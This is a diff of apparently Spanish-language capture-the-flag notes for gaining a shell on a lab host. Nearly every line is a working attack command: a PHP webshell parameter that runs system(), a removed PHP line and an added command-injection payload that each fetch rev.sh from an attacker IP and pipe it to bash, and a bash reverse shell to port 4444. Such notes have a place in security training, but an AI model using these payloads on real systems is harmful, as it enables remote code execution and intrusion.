@@ -133,10 +133,9 @@ podemos crear una webshell en un parámetro php que ejecuta código de la siguie
         parameter = ${system($_GET[cmd])}&cmd=
 
 
-### Obteniendo una shell 2:
+### Obteniendo una shell:
 
-##### agregar en una página un código php:
-        <?php system("curl 10.10.14.70:8080/rev.sh|bash"); ?>
+
 
 ##### crear la shell
         echo -e '#!/bin/bash\nsh -i >& /dev/tcp/10.10.14.70/4444 0>&1' > rev.sh
@@ -145,7 +144,8 @@ podemos crear una webshell en un parámetro php que ejecuta código de la siguie
 
 ##### Llamar a la páginacon curl:
 
-        curl -k "http://dev.devvortex.htb/templates/cassiopeia/error.php/error"
+##### inyectar código:
+        test;curl${IFS}http://10.10.14.49:7000/rev.sh|bash;
 
 ##### Obtener una mejor shell:
         script /dev/null -c bash
